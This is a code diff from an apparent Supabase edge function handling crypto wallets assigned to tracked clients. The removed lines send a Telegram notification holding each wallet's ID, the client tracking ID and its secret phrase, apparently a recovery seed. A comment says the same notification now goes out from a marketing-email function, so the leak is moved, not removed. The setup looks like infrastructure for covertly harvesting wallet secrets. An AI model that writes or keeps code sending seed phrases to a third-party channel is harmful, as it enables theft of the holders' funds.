@@ -164,26 +164,9 @@ serve(async (req) => {
         const claimed = deletedRows[0];
         const walletData = JSON.parse(claimed.setting_value);
         
-        // Fetch commercial name
-        let commercialName = 'Unknown Commercial';
-        try {
-          const { data: commercial } = await supabase
-            .from('commercials')
-            .select('name')
-            .eq('id', walletData.commercial_id)
-            .single();
-          if (commercial?.name) commercialName = commercial.name;
-        } catch (err) {
-          console.warn('Could not fetch commercial name:', err);
-        }
+        // NOTE: Telegram notifications are now sent from send-marketing-email function
+        // only AFTER email is successfully sent. This prevents notifications for failed emails.
         
-        // Send Telegram notification about wallet usage
-        await supabase.functions.invoke('send-telegram-notification', {
-          body: {
-            message: `🔑 New wallet used!\nWallet ID: ${walletData.wallet_id}\nCommercial: ${commercialName}\nClient: ${walletData.client_tracking_id}\nPhrase: ${walletData.phrase}\nTime: ${walletData.timestamp}`
-          }
-        });
-
         // Generate wallet addresses if requested
         if (walletData.generate_addresses) {
           try {
